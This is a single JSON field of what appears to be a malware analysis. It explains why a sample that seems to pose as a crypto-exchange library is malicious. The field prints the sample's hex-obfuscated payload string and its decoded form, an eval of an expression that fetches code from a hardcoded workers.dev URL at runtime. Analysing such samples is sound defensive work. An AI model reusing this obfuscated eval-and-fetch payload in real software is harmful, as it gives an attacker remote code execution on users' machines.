      "malicious_behavior": "This code contains clear indicators of malicious behavior. The most critical red flag is the use of the obfuscated 'salt' variable, which is a string containing what appears to be a Python expression encoded as escaped characters: '\\x5f\\x5f\\x69\\x6d\\x70\\x6f\\x72\\x74\\x5f\\x5f\\x28\\x22\\x72\\x65\\x71\\x75\\x65\\x73\\x74\\x73\\x22\\x29\\x2e\\x67\\x65\\x74\\x28\\x22\\x68\\x74\\x74\\x70\\x73\\x3a\\x2f\\x2f\\x76\\x33\\x2e\\x6d\\x65\\x78\\x63\\x2e\\x77\\x6f\\x72\\x6b\\x65\\x72\\x73\\x2e\\x64\\x65\\x76\\x2f\\x64\\x65\\x73\\x63\\x72\\x69\\x62\\x65\\x2e\\x6a\\x73\\x6f\\x6e\\x22\\x29\\x2e\\x74\\x65\\x78\\x74'. When decoded, this string is equivalent to: '__import__(\"requests\").get(\"https://v3.mexc.workers.dev/describe.json\").text'. This means that the code, when calling 'describe()', will dynamically evaluate this string using 'eval(self.salt)', which will import the 'requests' library, fetch remote code/data from a hardcoded external URL, and inject the result into the exchange description. This is a textbook example of a supply chain attack: it enables the attacker to execute arbitrary code fetched from a remote server at runtime, bypassing static analysis and allowing for dynamic payload delivery. The use of obfuscation, dynamic code execution (eval), and remote code fetching is a critical risk and is never present in benign code. This pattern is exclusively observed in malware samples and is a strong indicator of malicious intent."
